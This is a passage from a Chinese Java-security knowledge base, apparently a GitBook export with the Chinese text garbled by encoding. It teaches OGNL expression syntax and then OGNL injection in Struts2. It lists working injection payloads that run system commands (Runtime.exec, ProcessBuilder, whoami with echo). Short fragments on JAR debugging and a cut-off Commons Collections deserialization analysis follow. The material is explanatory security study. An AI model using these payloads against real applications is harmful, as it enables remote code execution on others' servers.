Languageï¼ˆå¯¹è±¡å¯¼èˆªå›¾è¯­è¨€ï¼‰çš„ç¼©å†™ï¼Œå®ƒæ˜¯ä¸€ç§åŠŸèƒ½å¼ºå¤§çš„è¡¨è¾¾å¼è¯­è¨€ï¼Œé€šè¿‡å®ƒç®€å•ä¸€è‡´çš„è¡¨è¾¾å¼è¯­æ³•ï¼Œå¯ä»¥å­˜å–å¯¹è±¡çš„ä»»æ„å±æ€§ï¼Œè°ƒç”¨å¯¹è±¡çš„æ–¹æ³•ï¼Œéå†æ•´ä¸ªå¯¹è±¡çš„ç»“æ„å›¾ï¼Œå®ç°å­—æ®µç±»å‹è½¬åŒ–ç­‰åŠŸèƒ½ã€‚å®ƒä½¿ç”¨ç›¸åŒçš„è¡¨è¾¾å¼å»å­˜å–å¯¹è±¡çš„å±æ€§ã€‚è¿™æ ·å¯ä»¥æ›´å¥½çš„å–å¾—æ•°æ®ã€‚ Ognl æ˜¯ä¸€ä¸ªåŠŸèƒ½å¼ºå¤§çš„è¡¨è¾¾å¼è¯­è¨€ï¼Œç”¨æ¥è·å–å’Œè®¾ç½® java å¯¹è±¡çš„å±æ€§ ï¼Œå®ƒæ—¨åœ¨æä¾›ä¸€ä¸ªæ›´é«˜æŠ½è±¡åº¦è¯­æ³•æ¥å¯¹ java å¯¹è±¡å›¾è¿›è¡Œå¯¼èˆªã€‚ å®˜æ–¹æ–‡æ¡£ï¼šhttps://commons.apache.org/proper/commons-ognl/language-guide.html å¯¹äºå¼€å‘è€…æ¥è¯´ï¼Œä½¿ç”¨ OGNLï¼Œå¯ä»¥ç”¨ç®€æ´çš„è¯­æ³•æ¥å®Œæˆå¯¹ java å¯¹è±¡çš„å¯¼èˆªã€‚é€šå¸¸æ¥è¯´ï¼šé€šè¿‡ä¸€ä¸ª â€œè·¯å¾„â€ æ¥å®Œæˆå¯¹è±¡ä¿¡æ¯çš„å¯¼èˆªï¼Œè¿™ä¸ª â€œè·¯å¾„â€ å¯ä»¥æ˜¯åˆ° java bean çš„æŸä¸ªå±æ€§ï¼Œæˆ–è€…é›†åˆä¸­çš„æŸä¸ªç´¢å¼•çš„å¯¹è±¡ï¼Œç­‰ç­‰ï¼Œè€Œä¸æ˜¯ç›´æ¥ä½¿ç”¨ get æˆ–è€… set æ–¹æ³•æ¥å®Œæˆã€‚ ä¸‰è¦ç´  é¦–å…ˆæ¥ä»‹ç»ä¸‹ OGNL çš„ä¸‰è¦ç´ ï¼š è¡¨è¾¾å¼ï¼ˆExpressionï¼‰ï¼š è¡¨è¾¾å¼æ˜¯æ•´ä¸ª OGNL çš„æ ¸å¿ƒå†…å®¹ï¼Œæ‰€æœ‰çš„ OGNL æ“ä½œéƒ½æ˜¯é’ˆå¯¹è¡¨è¾¾å¼è§£æåè¿›è¡Œçš„ã€‚é€šè¿‡è¡¨è¾¾å¼æ¥å‘Šè¯‰ OGNL æ“ä½œåˆ°åº•è¦å¹²äº›ä»€ä¹ˆã€‚å› æ­¤ï¼Œè¡¨è¾¾å¼å…¶å®æ˜¯ä¸€ä¸ªå¸¦æœ‰è¯­æ³•å«ä¹‰çš„å­—ç¬¦ä¸²ï¼Œæ•´ä¸ªå­—ç¬¦ä¸²å°†è§„å®šæ“ä½œçš„ç±»å‹å’Œå†…å®¹ã€‚OGNL è¡¨è¾¾å¼æ”¯æŒå¤§é‡çš„è¡¨è¾¾å¼ï¼Œå¦‚ â€œé“¾å¼è®¿é—®å¯¹è±¡â€ã€è¡¨è¾¾å¼è®¡ç®—ã€ç”šè‡³è¿˜æ”¯æŒ Lambda è¡¨è¾¾å¼ã€‚ Root å¯¹è±¡ï¼š OGNL çš„ Root å¯¹è±¡å¯ä»¥ç†è§£ä¸º OGNL çš„æ“ä½œå¯¹è±¡ã€‚å½“æˆ‘ä»¬æŒ‡å®šäº†ä¸€ä¸ªè¡¨è¾¾å¼çš„æ—¶å€™ï¼Œæˆ‘ä»¬éœ€è¦æŒ‡å®šè¿™ä¸ªè¡¨è¾¾å¼é’ˆå¯¹çš„æ˜¯å“ªä¸ªå…·ä½“çš„å¯¹è±¡ã€‚è€Œè¿™ä¸ªå…·ä½“çš„å¯¹è±¡å°±æ˜¯ Root å¯¹è±¡ï¼Œè¿™å°±æ„å‘³ç€ï¼Œå¦‚æœæœ‰ä¸€ä¸ª OGNL è¡¨è¾¾å¼ï¼Œé‚£ä¹ˆæˆ‘ä»¬éœ€è¦é’ˆå¯¹ Root å¯¹è±¡æ¥è¿›è¡Œ OGNL è¡¨è¾¾å¼çš„è®¡ç®—å¹¶ä¸”è¿”å›ç»“æœã€‚ ä¸Šä¸‹æ–‡ç¯å¢ƒï¼š æœ‰ä¸ª Root å¯¹è±¡å’Œè¡¨è¾¾å¼ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨ OGNL è¿›è¡Œç®€å•çš„æ“ä½œäº†ï¼Œå¦‚å¯¹ Root å¯¹è±¡çš„èµ‹å€¼ä¸å–å€¼æ“ä½œã€‚ä½†æ˜¯ï¼Œå®é™…ä¸Šåœ¨ OGNL çš„å†…éƒ¨ï¼Œæ‰€æœ‰çš„æ“ä½œéƒ½ä¼šåœ¨ä¸€ä¸ªç‰¹å®šçš„æ•°æ®ç¯å¢ƒä¸­è¿è¡Œã€‚è¿™ä¸ªæ•°æ®ç¯å¢ƒå°±æ˜¯ä¸Šä¸‹æ–‡ç¯å¢ƒï¼ˆContextï¼‰ã€‚OGNL çš„ä¸Šä¸‹æ–‡ç¯å¢ƒæ˜¯ä¸€ä¸ª Map ç»“æ„ï¼Œç§°ä¹‹ä¸º OgnlContextã€‚Root å¯¹è±¡ä¹Ÿä¼šè¢«æ·»åŠ åˆ°ä¸Šä¸‹æ–‡ç¯å¢ƒå½“ä¸­å»ã€‚ è¯´ç™½äº†ä¸Šä¸‹æ–‡å°±æ˜¯ä¸€ä¸ª MAP ç»“æ„ï¼Œå®ƒå®ç°äº† java.utils.Map çš„æ¥å£ã€‚ ä½¿ç”¨OGNLè¡¨è¾¾å¼ pom.xml ognl ognl 3.1.11 åŸºç¡€ç”¨æ³•ä¸¾ä¾‹ å¯¹Rootå¯¹è±¡çš„è®¿é—® OGNL ä½¿ç”¨çš„æ˜¯ä¸€ç§é“¾å¼çš„é£æ ¼è¿›è¡Œå¯¹è±¡çš„è®¿é—®ï¼Œä¸­é—´ä½¿ç”¨.è¿›è¡Œè¿æ¥ï¼›æ‰€æœ‰çš„OGNLè¡¨è¾¾å¼éƒ½åŸºäºå½“å‰å¯¹è±¡çš„ä¸Šä¸‹æ–‡æ¥å®Œæˆæ±‚å€¼è¿ç®—ï¼Œé“¾çš„å‰é¢éƒ¨åˆ†çš„ç»“æœå°†ä½œä¸ºåé¢æ±‚å€¼çš„ä¸Šä¸‹æ–‡ã€‚ package org.example; import lombok.Data; import ognl.Ognl; import ognl.OgnlException; public class OgnlTest { public static void main(String[] args) throws OgnlException { User user = new User(); user.setAge(16); user.setName(\"hello\"); Info info = new Info(\"1\",\"2\"); user.setInfo(info); System.out.println(Ognl.getValue(\"age\", user)); // 16 System.out.println(Ognl.getValue(\"name\", user)); // hello System.out.println(Ognl.getValue(\"name.length\", user)); // 5 System.out.println(Ognl.getValue(\"info\", user)); // Info(a=1, b=2) System.out.println(Ognl.getValue(\"info.a\", user)); // 1 } } @Data class User { private String name; private int age; private Info info; } @Data class Info { private String a; private String b; public Info(String a, String b){ this.a = a; this.b = b; } } å¯¹ä¸Šä¸‹æ–‡å¯¹è±¡çš„è®¿é—® ä½¿ç”¨ OGNL çš„æ—¶å€™å¦‚æœä¸è®¾ç½®ä¸Šä¸‹æ–‡å¯¹è±¡ï¼Œç³»ç»Ÿä¼šè‡ªåŠ¨åˆ›å»ºä¸€ä¸ªä¸Šä¸‹æ–‡å¯¹è±¡ï¼Œå¦‚æœä¼ å…¥çš„å‚æ•°å½“ä¸­åŒ…å«äº†ä¸Šä¸‹æ–‡å¯¹è±¡åˆ™ä¼šä½¿ç”¨ä¼ å…¥çš„ä¸Šä¸‹æ–‡å¯¹è±¡ã€‚ å½“è®¿é—®ä¸Šä¸‹æ–‡ç¯å¢ƒå½“ä¸­çš„å‚æ•°æ—¶å€™ï¼Œéœ€è¦åœ¨è¡¨è¾¾å¼å‰é¢åŠ ä¸Š '#' ï¼Œè¡¨ç¤ºäº†ä¸è®¿é—® Root å¯¹è±¡çš„åŒºåˆ«ã€‚ package org.example; import lombok.Data; import ognl.Ognl; import ognl.OgnlException; import java.util.HashMap; import java.util.Map; public class OgnlTest { public static void main(String[] args) throws OgnlException { User user = new User(); user.setAge(16); user.setName(\"hello\"); Info info = new Info(\"1\",\"2\"); user.setInfo(info); Map context = new HashMap(); context.put(\"test\", \"testValue\"); context.put(\"aaa\", user); System.out.println(Ognl.getValue(\"#test\", context, user)); // testValue System.out.println(Ognl.getValue(\"#aaa\", context, user)); // User(name=hello, age=16, info=Info(a=1, b=2)) System.out.println(Ognl.getValue(\"#aaa.name\", context, user)); // hello } } @Data class User { private String name; private int age; private Info info; } @Data class Info { private String a; private String b; public Info(String a, String b){ this.a = a; this.b = b; } } å¯¹é™æ€å˜é‡çš„è®¿é—®â€¼ï¸ åœ¨ OGNL è¡¨è¾¾å¼å½“ä¸­ä¹Ÿå¯ä»¥è®¿é—®é™æ€å˜é‡æˆ–è€…è°ƒç”¨é™æ€æ–¹æ³•ï¼Œæ ¼å¼å¦‚ @[class]@[field/method()]ã€‚ package org.example; import ognl.Ognl; import ognl.OgnlException; public class OgnlTest { public static String test = \"66666\"; public static void main(String[] args) throws OgnlException { System.out.println(Ognl.getValue(\"@org.example.OgnlTest@test\", null)); } } æ–¹æ³•çš„è°ƒç”¨â€¼ï¸ å¦‚æœéœ€è¦è°ƒç”¨ Root å¯¹è±¡æˆ–è€…ä¸Šä¸‹æ–‡å¯¹è±¡å½“ä¸­çš„æ–¹æ³•ä¹Ÿå¯ä»¥ä½¿ç”¨ç±»ä¼¼çš„æ–¹å¼æ¥è°ƒç”¨ã€‚ç”šè‡³å¯ä»¥ä¼ å…¥å‚æ•°ã€‚ èµ‹å€¼çš„æ—¶å€™å¯ä»¥é€‰æ‹©ä¸Šä¸‹æ–‡å½“ä¸­çš„å…ƒç´ è¿›è¡Œç»™ Root å¯¹è±¡çš„ name å±æ€§èµ‹å€¼ã€‚ package org.example; import lombok.Data; import ognl.Ognl; import ognl.OgnlException; import java.util.HashMap; import java.util.Map; public class OgnlTest { public static void main(String[] args) throws OgnlException { User user = new User(); Map context = new HashMap(); context.put(\"test\", \"testValue\"); context.put(\"aaa\", user); System.out.println(Ognl.getValue(\"getName()\", context, user)); // null Ognl.getValue(\"setName(#test)\", context, user); // æ‰§è¡ŒsetNameæ–¹æ³• System.out.println(Ognl.getValue(\"getName()\", context, user)); // testValue } } @Data class User { private String name; private int age; } å¯¹æ•°ç»„å’Œé›†åˆçš„è®¿é—® OGNL æ”¯æŒå¯¹æ•°ç»„æŒ‰ç…§æ•°ç»„ä¸‹æ ‡çš„é¡ºåºè¿›è¡Œè®¿é—®ã€‚æ­¤æ–¹å¼ä¹Ÿé€‚ç”¨äºå¯¹é›†åˆçš„è®¿é—®ï¼Œå¯¹äº Map æ”¯æŒä½¿ç”¨é”®è¿›è¡Œè®¿é—®ã€‚ package org.example; import ognl.Ognl; import ognl.OgnlException; import java.util.ArrayList; import java.util.HashMap; import java.util.List; import java.util.Map; public class OgnlTest { public static void main(String[] args) throws OgnlException { List list = new ArrayList<>(); list.add(\"123\"); list.add(\"456\"); Map map = new HashMap(); map.put(\"test1\", \"value1\"); Map context = new HashMap(); context.put(\"list\", list); context.put(\"map\", map); System.out.println(Ognl.getValue(\"#list[0]\", context, list)); // 123 System.out.println(Ognl.getValue(\"#map['test1']\", context, map)); // value1 } } æŠ•å½±ä¸é€‰æ‹© OGNL æ”¯æŒç±»ä¼¼æ•°æ®åº“å½“ä¸­çš„é€‰æ‹©ä¸æŠ•å½±åŠŸèƒ½ã€‚ ä¸ªäººæ„Ÿè§‰æœ‰ç‚¹ç±»ä¼¼stream æŠ•å½±ï¼šé€‰å‡ºé›†åˆå½“ä¸­çš„ç›¸åŒå±æ€§ç»„åˆæˆä¸€ä¸ªæ–°çš„é›†åˆã€‚è¯­æ³•ä¸º collection.{XXX}ï¼ŒXXX å°±æ˜¯é›†åˆä¸­æ¯ä¸ªå…ƒç´ çš„å…¬å…±å±æ€§ã€‚ é€‰æ‹©ï¼šé€‰æ‹©å°±æ˜¯é€‰æ‹©å‡ºé›†åˆå½“ä¸­ç¬¦åˆæ¡ä»¶çš„å…ƒç´ ç»„åˆæˆæ–°çš„é›†åˆã€‚è¯­æ³•ä¸º collection.{Y XXX}ï¼Œå…¶ä¸­ Y æ˜¯ä¸€ä¸ªé€‰æ‹©æ“ä½œç¬¦ï¼ŒXXX æ˜¯é€‰æ‹©ç”¨çš„é€»è¾‘è¡¨è¾¾å¼ã€‚ é€‰æ‹©æ“ä½œç¬¦æœ‰ 3 ç§ï¼š ? ï¼šé€‰æ‹©æ»¡è¶³æ¡ä»¶çš„æ‰€æœ‰å…ƒç´  ^ï¼šé€‰æ‹©æ»¡è¶³æ¡ä»¶çš„ç¬¬ä¸€ä¸ªå…ƒç´  $ï¼šé€‰æ‹©æ»¡è¶³æ¡ä»¶çš„æœ€åä¸€ä¸ªå…ƒç´  package org.example; import lombok.Data; import ognl.Ognl; import ognl.OgnlException; import java.util.ArrayList; import java.util.HashMap; import java.util.Map; public class OgnlTest { public static void main(String[] args) throws OgnlException { User u1 = new User(\"name1\", 11); User u2 = new User(\"name2\", 22); User u3 = new User(\"name3\", 33); User u4 = new User(\"name4\", 44); ArrayList list = new ArrayList(); list.add(u1); list.add(u2); list.add(u3); list.add(u4); Map context = new HashMap(); context.put(\"list\", list); System.out.println(Ognl.getValue(\"#list.{age}\", context, list)); // [11, 22, 33, 44] System.out.println(Ognl.getValue(\"#list.{? #this.age > 22}\", context, list)); // [User(name=name3, age=33), User(name=name4, age=44)] System.out.println(Ognl.getValue(\"#list.{^ #this.age > 22}\", context, list)); // [User(name=name3, age=33)] System.out.println(Ognl.getValue(\"#list.{$ #this.age > 22}\", context, list)); // [User(name=name4, age=44)] } } @Data class User { private String name; private int age; public User(String name, int age) { this.name = name; this.age = age; } } åˆ›å»ºå¯¹è±¡â€¼ï¸ OGNL æ”¯æŒç›´æ¥ä½¿ç”¨è¡¨è¾¾å¼æ¥åˆ›å»ºå¯¹è±¡ã€‚ä¸»è¦æœ‰ä¸‰ç§æƒ…å†µï¼š æ„é€  List å¯¹è±¡ï¼šä½¿ç”¨ {}, ä¸­é—´ä½¿ç”¨ ',' è¿›è¡Œåˆ†å‰²å¦‚ {\"aa\", \"bb\", \"cc\"} æ„é€  Map å¯¹è±¡ï¼šä½¿ç”¨ #{}ï¼Œä¸­é—´ä½¿ç”¨ ', è¿›è¡Œåˆ†å‰²é”®å€¼å¯¹ï¼Œé”®å€¼å¯¹ä½¿ç”¨ ':' åŒºåˆ†ï¼Œå¦‚ #{\"key1\" : \"value1\", \"key2\" : \"value2\"} æ„é€ ä»»æ„å¯¹è±¡ï¼šç›´æ¥ä½¿ç”¨å·²çŸ¥çš„å¯¹è±¡çš„æ„é€ æ–¹æ³•è¿›è¡Œæ„é€ ã€‚ System.out.println(Ognl.getValue(\"{'key1','value1'}\", null)); // [key1, value1] System.out.println(Ognl.getValue(\"#{'key1':'value1'}\", null)); // {key1=value1} System.out.println(Ognl.getValue(\"new java.lang.String('123')\", null)); // 123 # å’Œ % å’Œ $ çš„åŒºåˆ« #ç¬¦ #ç¬¦ä¸»è¦æœ‰ä¸‰ç§ç”¨é€”ï¼š è®¿é—®éæ ¹å¯¹è±¡å±æ€§ï¼Œå³è®¿é—®OGNLä¸Šä¸‹æ–‡å’ŒActionä¸Šä¸‹æ–‡ï¼Œç”±äºStruts2ä¸­å€¼æ ˆè¢«è§†ä¸ºæ ¹å¯¹è±¡ï¼Œæ‰€ä»¥è®¿é—®å…¶ä»–éæ ¹å¯¹è±¡æ—¶éœ€è¦åŠ #å‰ç¼€ï¼Œ#ç›¸å½“äºActionContext.getContext()ï¼› ç”¨äºè¿‡æ»¤å’ŒæŠ•å½±ï¼ˆprojectingï¼‰é›†åˆï¼Œå¦‚books.{? #this.priceï¼› ç”¨äºæ„é€ Mapï¼Œå¦‚#{'foo1':'bar1', 'foo2':'bar2'}ï¼› %ç¬¦ %ç¬¦çš„ç”¨é€”æ˜¯åœ¨æ ‡å¿—çš„å±æ€§ä¸ºå­—ç¬¦ä¸²ç±»å‹æ—¶ï¼Œå‘Šè¯‰æ‰§è¡Œç¯å¢ƒ%{}é‡Œçš„æ˜¯OGNLè¡¨è¾¾å¼å¹¶è®¡ç®—è¡¨è¾¾å¼çš„å€¼ã€‚ $ç¬¦ $ç¬¦çš„ä¸»è¦ä½œç”¨æ˜¯åœ¨ç›¸å…³é…ç½®æ–‡ä»¶ä¸­å¼•å…¥OGNLè¡¨è¾¾å¼ï¼Œè®©å…¶åœ¨é…ç½®æ–‡ä»¶ä¸­ä¹Ÿèƒ½è§£æOGNLè¡¨è¾¾å¼ã€‚ï¼ˆæ¢å¥è¯è¯´ï¼Œ$ç”¨äºåœ¨é…ç½®æ–‡ä»¶ä¸­è·å–ValueStackçš„å€¼ç”¨çš„ï¼‰ã€‚ # å’Œ . å’Œ @ çš„åŒºåˆ« è·å–é™æ€å‡½æ•°å’Œå˜é‡çš„æ—¶å€™ç”¨@ è·å–éé™æ€å‡½æ•°ç”¨.å·è·å– è·å–éé™æ€å˜é‡ç”¨#è·å– OGNLè¡¨è¾¾å¼æ³¨å…¥ webwork2å’Œç°åœ¨çš„Struts2.xä¸­ä½¿ç”¨OGNLå–ä»£åŸæ¥çš„ELæ¥åšç•Œé¢æ•°æ®ç»‘å®šï¼Œæ‰€è°“ç•Œé¢æ•°æ®ç»‘å®šï¼Œä¹Ÿå°±æ˜¯æŠŠç•Œé¢å…ƒç´ ï¼ˆä¾‹å¦‚ä¸€ä¸ªtextfield,hidden)å’Œå¯¹è±¡å±‚æŸä¸ªç±»çš„æŸä¸ªå±æ€§ç»‘å®šåœ¨ä¸€èµ·ï¼Œä¿®æ”¹å’Œæ˜¾ç¤ºè‡ªåŠ¨åŒæ­¥ã€‚è€ŒStruts2æ¡†æ¶æ­£æ˜¯å› ä¸ºæ»¥ç”¨OGNLè¡¨è¾¾å¼ï¼Œä½¿ä¹‹æˆä¸ºäº†â€œæ¼æ´ä¹‹ç‹â€ã€‚ ç”±å‰é¢çŸ¥é“ï¼ŒOGNLå¯ä»¥è®¿é—®é™æ€æ–¹æ³•ã€å±æ€§ä»¥åŠå¯¹è±¡æ–¹æ³•ç­‰ï¼Œå…¶ä¸­åŒ…å«å¯ä»¥æ‰§è¡Œæ¶æ„æ“ä½œå¦‚å‘½ä»¤æ‰§è¡Œçš„ç±»java.lang.Runtimeç­‰ï¼Œå½“OGNLè¡¨è¾¾å¼å¤–éƒ¨å¯æ§æ—¶ï¼Œæ”»å‡»è€…å°±å¯ä»¥æ„é€ æ¶æ„çš„OGNLè¡¨è¾¾å¼æ¥è®©ç¨‹åºæ‰§è¡Œæ¶æ„æ“ä½œï¼Œè¿™å°±æ˜¯OGNLè¡¨è¾¾å¼æ³¨å…¥æ¼æ´ã€‚ æ³¨å…¥ä¸¾ä¾‹ æ ¼å¼@[class]@[field/method()] package org.example; import ognl.Ognl; import ognl.OgnlException; public class OgnlTest { public static void main(String[] args) throws OgnlException { // @[class]@[field/method()] String payload = \"@java.lang.Runtime@getRuntime().exec('open -na Calculator')\"; System.out.println(Ognl.getValue(payload, null)); } } èƒ½è§£æOGNLçš„API èƒ½è§£æOGNLçš„APIå¦‚ä¸‹è¡¨ï¼š ç±»å æ–¹æ³•å com.opensymphony.xwork2.util.TextParseUtil translateVariables,translateVariablesCollection com.opensymphony.xwork2.util.TextParser evaluate com.opensymphony.xwork2.util.OgnlTextParser evaluate com.opensymphony.xwork2.ognl.OgnlUtil setProperties,setProperty,setValue,getValue,callMethod,compile com.opensymphony.xwork2.util.ValueStack findString,findValue,setValue,setParameter com.opensymphony.xwork2.ognl.OgnlValueStack findString,findValue,setValue,setParameter,trySetValue org.apache.struts2.util.VelocityStrutsUtil evaluate org.apache.struts2.util.StrutsUtil isTrue,findString,findValue,getText,translateVariables,makeSelectList org.apache.struts2.views.jsp.ui.OgnlTool findValue ognl.Ognl parseExpression,getValue,setValue ä»¥ä¸‹æ˜¯è°ƒç”¨è¿‡ç¨‹ä¸­å¯èƒ½ä¼šæ¶‰åŠåˆ°çš„ä¸€äº›ç±»ï¼š æ¶‰åŠç±»å æ–¹æ³•å com.opensymphony.xwork2.ognl.OgnlReflectionProvider getGetMethod,getSetMethod,getField,setProperties,setProperty,getValue,setValue com.opensymphony.xwork2.util.reflection.ReflectionProvider getGetMethod,getSetMethod,getField,setProperties,setProperty,getValue,setValue HTTPè¯·æ±‚ä¸­å¸¸è§çš„æ³¨å…¥ç‚¹ å¸¸ç”¨payload //è·å–contexté‡Œé¢çš„å˜é‡å€¼ #user #user.name //ä½¿ç”¨runtimeæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ @java.lang.Runtime@getRuntime().exec(\"calc\") //ä½¿ç”¨processbuilderæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ (new java.lang.ProcessBuilder(new java.lang.String[]{\"calc\"})).start() //è·å–å½“å‰ç»å¯¹è·¯å¾„ @java.lang.System@getProperty(\"user.dir\") // e-moboleå¸¦å›æ˜¾ @org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('whoami').getInputStream()) å‚è€ƒ OGNLè¡¨è¾¾å¼æ³¨å…¥æ¼æ´æ€»ç»“ Struts2è‘—åRCEæ¼æ´å¼•å‘çš„åå¹´ä¹‹æ€ Struts2 ä¸­çš„OGNLã€è¡¨è¾¾å¼æ³¨å…¥åŠé˜²å¾¡ Copyright Â© d4m1ts 2022 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2021-12-25 18:51:59 "},"ä¸ªäººçŸ¥è¯†åº“/02.ä»£ç å®¡è®¡/01.Javaå®‰å…¨/1.å®¡è®¡åŸºç¡€/12.IDEAè°ƒè¯•JAR.html":{"url":"ä¸ªäººçŸ¥è¯†åº“/02.ä»£ç å®¡è®¡/01.Javaå®‰å…¨/1.å®¡è®¡åŸºç¡€/12.IDEAè°ƒè¯•JAR.html","title":"12.IDEAè°ƒè¯•JAR","keywords":"","body":"TreeviewCopyright Â© d4m1ts all right reserved, powered by aleen42 å‰è¨€ å‡†å¤‡ å¼€å§‹è°ƒè¯• æœ€å å‰è¨€ è¿œç¨‹è°ƒè¯•ç›¸å¯¹æ¥è¯´è¿˜æ˜¯æ¯”è¾ƒç¹ççš„ï¼Œå¦‚æœå¯ä»¥ç»™jaræ‹¿åˆ°æœ¬åœ°æ¥è¿è¡Œè°ƒè¯•ï¼Œä¼šæ–¹ä¾¿ç®€å•å¾ˆå¤šã€‚ å‡†å¤‡ éšä¾¿å‡†å¤‡ä¸ªJARå³å¯ï¼Œæ¯”å¦‚ https://github.com/halo-dev/halo ä¸‹è½½åå¾—åˆ°halo.jarï¼Œé€šè¿‡å‘½ä»¤java -jar halo.jarå³å¯è¿è¡Œï¼ˆè¿™ä¸ªjarè¿è¡Œéœ€è¦jdk11ï¼‰ å¼€å§‹è°ƒè¯• æ–°å»ºä¸€ä¸ªmavenç©ºé¡¹ç›®ï¼Œä¸ºäº†è¿è¡Œjaré€‰æ‹©ç”¨jdk11ï¼Œå…¶ä»–çš„éšä¾¿é€‰é€‰å³å¯ æ·»åŠ é…ç½®ï¼Œé€‰æ‹©JAR Application ç„¶åæ ¹æ®å®é™…æƒ…å†µé…ç½® ç‚¹å‡»Applyï¼Œç„¶åå°±å¯ä»¥åœ¨IDEAé‡Œé¢è¿è¡Œè¿™ä¸ªJARäº† ä½†è¿™ä¸ªæ—¶å€™è¿˜ä¸èƒ½è°ƒè¯•ï¼Œè¿˜éœ€è¦æ·»åŠ classesä¾èµ–å…³ç³» ä¹‹å‰ä¹Ÿè¯´è¿‡ï¼Œè¦æ·»åŠ äº†ä¾èµ–å…³ç³»IDEAæ‰ä¼šæ‰§è¡Œè¿™ä¸ªä»£ç ï¼Œæ‰èƒ½çŸ¥é“ä½ ä¸‹çš„æ–­ç‚¹ï¼Œæ‰ä¼šåœ¨é‚£é˜»æ–­è®©ä½ åˆ†æ å…ˆè§£å‹è¿™ä¸ªjar ç„¶åç»™ç›®å½•libæ·»åŠ åˆ°ä¾èµ–ä¸­ï¼Œä¸ç„¶è¿™ä¸ªjarä½¿ç”¨çš„å…¶ä»–jarä¾èµ–ä¸èƒ½è°ƒè¯• ç„¶åç»™ç›®å½•BOOT-INFæ·»åŠ åˆ°ä¾èµ–å…³ç³»ä¸­ ç„¶åå°±å¯ä»¥Debugè°ƒè¯•äº† ä¸‹æ–­ç‚¹æœ‰ä¸ªå‹¾è¡¨ç¤ºæˆåŠŸ æˆåŠŸæ‹¦æˆª æœ€å è™½ç„¶è¯´ä¸Šé¢å·²ç»å¯ä»¥å¼€å§‹è°ƒè¯•äº†ï¼Œä½†è¿˜æ˜¯æœ‰ä¸€äº›é—®é¢˜ ä¸€äº›å‡½æ•°å¯èƒ½å› ä¸ºä¸èƒ½åç¼–è¯‘ç­‰ç­‰åŸå› ï¼Œå¯¼è‡´æ‰¾ä¸åˆ°ï¼Œä¹Ÿä¼šå½±å“æˆ‘ä»¬çš„è¿›ç¨‹ æ‰€ä»¥æœ‰æ¡ä»¶çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥ä¸‹è½½ä»–çš„æºä»£ç ï¼Œç„¶åç»™æºä»£ç ä¹ŸåŠ å…¥è¿›å»ï¼ˆç›´æ¥ç‚¹ä¸Šé¢çš„æç¤ºchoice source fileå³å¯ï¼‰ Copyright Â© d4m1ts 2022 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2021-12-25 18:51:59 "},"ä¸ªäººçŸ¥è¯†åº“/02.ä»£ç å®¡è®¡/01.Javaå®‰å…¨/2.å„ç§åˆ†æ/01.Apache_Commons_Collectionsä¸­çš„ååºåˆ—åŒ–.html":{"url":"ä¸ªäººçŸ¥è¯†åº“/02.ä»£ç å®¡è®¡/01.Javaå®‰å…¨/2.å„ç§åˆ†æ/01.Apache_Commons_Collectionsä¸­çš„ååºåˆ—åŒ–.html","title":"01.Apache_Commons_Collectionsä¸­çš„ååºåˆ—åŒ–","keywords":"","body":"TreeviewCopyright Â© d4m1ts all right reserved, powered by aleen42 åŸºç¡€ä½¿ç”¨ èƒŒæ™¯ä»‹ç» ä¸»è¦ç‰¹ç‚¹ åŒ…ç»“æ„ä»‹ç» å¼•å…¥ä¾èµ– ä½¿ç”¨ä»‹ç» é€šç”¨é›†åˆ Bag é€šç”¨é›†åˆ BidiMap é€šç”¨é›†åˆ MapIterator é€šç”¨é›†åˆ OrderedMap é›†åˆå·¥å…·ç±» CollectionUtils æ£€æŸ¥æ˜¯å¦ä¸ºç©ºå…ƒç´  åˆå¹¶ä¸¤ä¸ªæ’åºåˆ—è¡¨ è½¬æ¢åˆ—è¡¨ è¿‡æ»¤åˆ—è¡¨ æ£€æŸ¥éç©ºåˆ—è¡¨ æ£€æŸ¥ç©ºçš„åˆ—è¡¨ æ£€æŸ¥å­åˆ—è¡¨ æ£€æŸ¥ç›¸äº¤ æ±‚å·®é›† æ±‚è”åˆé›† å‚è€ƒæ•™ç¨‹ Commons Collections1 åˆ†æ å‰è¨€ å‰ç½®çŸ¥è¯† POCç¤ºä¾‹ Transformer ConstantTransformer InvokerTransformerâ€¼ï¸ ChainedTransformerâ€¼ï¸ å‡ ä¸ªTransformerå®ç°ç±»æ•´ç† Map TransformedMapâ€¼ï¸ Map.Entry åå°„exec åå°„åˆ©ç”¨é“¾ ç®€åŒ–é“¾ ä½¿ç”¨AnnotationInvocationHandlerè§¦å‘ååºåˆ—åŒ– åˆ†æ POCæ„å»ºè¿‡ç¨‹ å®Œæ•´POC æ•´ä½“æ€è·¯ ä½¿ç”¨LazyMapåˆ©ç”¨é“¾ ä»‹ç» åŠ¨æ€ä»£ç†å¤ä¹  æ„å»ºPOC å®Œæ•´POC LazyMapåˆ©ç”¨é“¾è¡¥å…… å‚è€ƒ åŸºç¡€ä½¿ç”¨ èƒŒæ™¯ä»‹ç» Apache Commonsæ˜¯Apacheè½¯ä»¶åŸºé‡‘ä¼šçš„é¡¹ç›®ï¼Œæ›¾ç»éš¶å±äºJakartaé¡¹ç›®ã€‚Commonsçš„ç›®çš„æ˜¯æä¾›å¯é‡ç”¨çš„ã€è§£å†³å„ç§å®é™…çš„é€šç”¨é—®é¢˜ä¸”å¼€æºçš„Javaä»£ç ã€‚Commonsç”±ä¸‰éƒ¨åˆ†ç»„æˆï¼šProperï¼ˆæ˜¯ä¸€äº›å·²å‘å¸ƒçš„é¡¹ç›®ï¼‰ã€Sandboxï¼ˆæ˜¯ä¸€äº›æ­£åœ¨å¼€å‘çš„é¡¹ç›®ï¼‰å’ŒDormantï¼ˆæ˜¯ä¸€äº›åˆšå¯åŠ¨æˆ–è€…å·²ç»åœæ­¢ç»´æŠ¤çš„é¡¹ç›®ï¼‰ã€‚ Commons CollectionsåŒ…ä¸ºJavaæ ‡å‡†çš„Collections 